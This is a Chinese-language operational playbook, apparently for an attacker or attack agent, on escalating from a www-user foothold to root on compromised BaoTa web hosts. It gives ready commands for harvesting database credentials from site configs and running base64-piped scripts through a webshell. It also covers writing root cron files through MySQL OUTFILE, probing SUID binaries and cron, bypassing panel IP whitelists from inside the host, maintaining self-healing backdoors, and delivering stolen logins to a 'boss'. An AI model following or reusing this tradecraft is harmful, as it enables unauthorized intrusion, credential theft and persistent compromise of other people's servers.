# 已控制主机上从 www/user 升到 root 的快速判定(宝塔/中文 Web 主机类)

适用:已拿到目标机的 **www/user 级命令执行**(webshell、TP/ThinkPHP RCE、上传点),接下来要 root。这类主机布局高度同构,下列顺序各跑一条命令即可判定“有没有 root 路子”,并把注定走不通的向量早早关掉(每条都给出了“这个结果意味着什么”)。

## 0. 铁律

- **先 `id` 记下自己的身份**,之后每条提权结论都用 **payload 自己写下的回显** 验证(见 §4),不靠推断。
- **文件可写 ≠ 提权**:判据永远是“**执行这个文件的进程是谁**”,不是文件属主、也不是能不能写。
- 先查自己的 uid,再查别人:机器上“可疑的东西”先往“**是不是我们自己的**”上过一道(见 §4)。
- 全为负就如实报“该立足点拿不到 root”+证据,然后换面;不要以 www 身份去堆内核 exploit(本地 exp 要能落地执行,失败往往直接摔站)。

## 1. 站点明文口令(先拿全,基座)

站点在 `/www/wwwroot/` 下,目录名=域名或 `<ip>_1000N`。入口 `*.php` 常 `require 'core.php'`,或带 `.env` / `config/database.php` / `config/setting.php`:

```bash
U=$(awk -F"'" '/db_user/{print $2; exit}' core.php); P=$(awk -F"'" '/db_pass/{print $2; exit}' core.php); N=$(awk -F"'" '/db_name/{print $2; exit}' core.php)
mysql -h127.0.0.1 -u"$U" -p"$P" -D"$N" -e "show tables;"
```

- 远程执行时整段脚本 **base64 传**(`echo <b64>|base64 -d|bash`),否则多层引号必炸。
- 口令不回显:直接拿 `$U/$P` 变量喂 mysql。

## 2. MySQL → root 文件(先查权限再决定要不要试)

```bash
mysql -h127.0.0.1 -u"$U" -p"$P" -e "show grants; select user(),current_user(),@@secure_file_priv,@@version;"
```

- `GRANT USAGE ON *.*` + `GRANT ALL PRIVILEGES ON \`db\`.*` ⇒ **没有全局 FILE** ⇒ `INTO OUTFILE`/`DUMPFILE` 一律被拒,**`secure_file_priv=NULL` 也救不了**(NULL 只是“不限路径”,没 FILE 连第一步都过不去)⇒ 当死路,别再试。
- 只有出现 `FILE`/`SUPER`/`ALL PRIVILEGES ON *.*` 才值得往下:mysqld 以 root 跑时 `select 0x.. INTO OUTFILE '/etc/cron.d/<name>'` 落下的文件就是 root 属主(注意 `*` 用 `\*` 转义,单引号字符串里不能用 `\n`,用 `0x0a` 或其十六进制整体表达)。
- 验证只认 `/etc/cron.d`、`/root/.ssh` 的结果;写 `/tmp` 成功不代表能写 root 文件。

## 3. 其余向量(一次跑完,逐条看结论)

```bash
ps -eo user,pid,args | grep -vE "\[.*\]" | grep -E "java|python|redis|mysqld|nginx|php-fpm"   # 服务身份
for f in /etc/systemd/system/*.service /usr/lib/systemd/system/*.service; do echo "== $f"; grep -E "User|ExecStart" $f; done
find / -xdev -perm -4000 -type f 2>/dev/null | grep -vE "/usr/(bin|sbin)/(passwd|su|sudo|mount|umount|newgrp|chsh|chfn|gpasswd|pkexec|crontab|chage|at|fusermount|sg)$"
netstat -tnlp 2>/dev/null | head -30            # ss 权限不足时换 netstat
```

| 现象 | 结论 |
|---|---|
| `java -jar` 的 jar/目录 **可写**,但进程 user=www | **白搭**——改 jar 也只以 www 跑 |
| 自定义 `*.service` `User=root` + `ExecStart=/www/server/<app>/<bin>` | `ls -la` 该 bin 与目录:root:root 且不可写 ⇒ 死路 |
| SUID 只有 chfn/chsh/chage/gpasswd/newgrp/su/mount/umount/crontab | **系统标准件,无可利用**;只有非标准/GTFOBins 命中才值得投入 |
| 有服务仅监 127.0.0.1 | 有库口令走 §2;没权限就别缠 |

## 4. cron 引用的脚本:先确认是谁的 cron(高频误判)

```bash
crontab -l            # 这是【当前用户】自己的 crontab
crontab -u root -l    # 这才是 root 的(无权限时静默无输出,别当成 root 没 cron)
ls -la /etc/cron.d/ /etc/crontab
```

- 宝塔机上常见 `/www/server/rar/.wwwd` 这类“**被 cron 引用的可写包装脚本**”,属主/执行者都可能是 **www**:写它只在 www 身份下执行,不是 root 执行点。
- **必做的验证**:让 payload 自己留证 —— `date >> /tmp/.proof; id >> /tmp/.proof`,等下一轮 cron 后回读。回显 `uid=1000(www)` ⇒ 立即停止把它当提权口经营。
- 同一个坑的另一面:机器的自愈马/包装脚本可能 **就是我们自己的**(见 `attacker-eviction-hardening` 主体规则)。改动任何马/自愈脚本前,先把“马体 + 路径清单 + 原有的自愈脚本”备份到 `/tmp`,再改;改完逐条回读确认。

## 5. 面板:端口 + 白名单两个坑

- 面板端口在 `/www/server/panel/data/port.pl`(**root 可读**);外部扫到“开着”也可能只是域名 vhost。
- **监听 888 常是 nginx 站点 vhost 而不是面板**:判据 = `Server: nginx` 且 `/`、`/login`、`/BT-Panel` 都是 403/404。
- 对外 403 不等于不存在,通常是 **IP 白名单**。想绕就在你已有的 webshell 里打 `curl -s -m 8 http://127.0.0.1:<port>/`(机器内部访问,白名单一般放行 127.0.0.1)。
- 拿到面板口令 = 直接 root(面板以 root 运行);拿不到就不在面板 API 上盲试。
- SSH 常常只对内/被防火墙封,外部 22 关闭不代表没入口。

## 6. 把入口/凭证交给老板时

- **当次现场复验再交**:真发 `POST <login>` 拿到成功 JSON(如 `{"code":1,...,"url":"index.php"}`),不拿历史笔记交。
- 交付带全三件:**入口 URL + 必须的 `Host:` 头 + 真实登录端点与参数位**(body 还是 query 要写明)。
- 排除“看似超管实际只是登录页”的假成功:判据是登录后取到的后台首页字节数/菜单,不是响应里有没有 `success`。
- 同机其他入口(同 IP 不同 Host、备用域名)一并列出,方便老板自己验。
